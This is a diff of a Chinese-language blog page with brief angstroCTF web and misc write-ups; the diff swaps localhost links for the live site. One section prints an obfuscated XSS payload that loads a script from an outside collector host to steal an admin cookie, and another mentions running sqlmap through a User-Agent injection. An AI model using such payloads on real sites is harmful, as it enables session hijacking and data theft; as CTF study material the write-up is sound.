@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title>angstroCTF Web+Misc |  </title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="angstroCTF Web+Misc |   » Feed" href="http://localhost:4000/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="angstroCTF Web+Misc |   » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content="angstroCTF Web+Misc"/>
-    <meta property="og:url" content="http://localhost:4000/post/galW4kTUg/"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/galW4kTUg/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content=" "/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="http://localhost:4000"> </a>
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -99,11 +99,11 @@
         <div class="col-lg-8 col-md-10 mx-auto">
           <p>ws1:<br>
 追踪TCP流得到Flag<br>
-<img src="http://localhost:4000/post-images/1584240752587.png" alt="" loading="lazy"></p>
+<img src="https://guokeya.github.io/post-images/1584240752587.png" alt="" loading="lazy"></p>
 <!-- more -->
 <p>ws2:<br>
 HTTP流。导出JPG得到Flag<br>
-<img src="http://localhost:4000/post-images/1584240943390.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1584240943390.png" alt="" loading="lazy"><br>
 inputter:<br>
 源码如下</p>
 <pre><code>#define _GNU_SOURCE
@@ -163,29 +163,29 @@ a.py:</p>
 是一个git-pack的流量。首先wireshark分离出来<br>
 有一个git-receive-pack文件18KB.其他就1KB.<br>
 继续对此文件分离，得到Flag<br>
-<img src="http://localhost:4000/post-images/1584241829597.png" alt="" loading="lazy"></p>
+<img src="https://guokeya.github.io/post-images/1584241829597.png" alt="" loading="lazy"></p>
 <p>clam clam clam:<br>
 输入两次clam clam clam得到Flag<br>
 不知道为啥。</p>
 <p>The Magic Word:<br>
 右键查看源码<br>
-<img src="http://localhost:4000/post-images/1584241879497.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1584241879497.png" alt="" loading="lazy"><br>
 magic的值等于please give flag就能拿到flag。HTML改一下就行<br>
-<img src="http://localhost:4000/post-images/1584241931632.png" alt="" loading="lazy"></p>
+<img src="https://guokeya.github.io/post-images/1584241931632.png" alt="" loading="lazy"></p>
 <p>Xmas Still Stands:<br>
 XSS。直接给烨师傅的payload</p>
 <pre><code>&lt;img src=x onerror=eval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzeWUuY29tL3lleWV5ZT8nK01hdGgucmFuZG9tKCk='))&gt;
 </code></pre>
 <p>得到管理员cookie后。拿到flag</p>
 <p>Consolation:<br>
-<img src="http://localhost:4000/post-images/1584242031985.png" alt="" loading="lazy"></p>
+<img src="https://guokeya.github.io/post-images/1584242031985.png" alt="" loading="lazy"></p>
 <p>Git Good:<br>
 githacker下来后git log --reflog<br>
-<img src="http://localhost:4000/post-images/1584242219800.png" alt="" loading="lazy"></p>
+<img src="https://guokeya.github.io/post-images/1584242219800.png" alt="" loading="lazy"></p>
 <p>Secret Agents:<br>
 题目给出了源码<br>
 毫无过滤就带入sql语句。<br>
-<img src="http://localhost:4000/post-images/1584242265678.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1584242265678.png" alt="" loading="lazy"><br>
 ua头sqlmap跑以下就行</p>
 <p>Defund's Crypt<br>
 题目给出了源码<br>
@@ -216,7 +216,7 @@ ua头sqlmap跑以下就行</p>
 
           
           <p class="next-post">下一篇：
-            <a href="http://localhost:4000/post/MzHF-GZP0/">
+            <a href="https://guokeya.github.io/post/MzHF-GZP0/">
               <span class="post-title">
                 [SWPU2019]Web4(堆叠注入+Thinkphp审计)&rarr;
               </span>
@@ -260,7 +260,7 @@ ua头sqlmap跑以下就行</p>
             
               
               <li class="list-inline-item">
-              <a href="http://localhost:4000/atom.xml" target="_blank">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -275,10 +275,10 @@ ua头sqlmap跑以下就行</p>
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
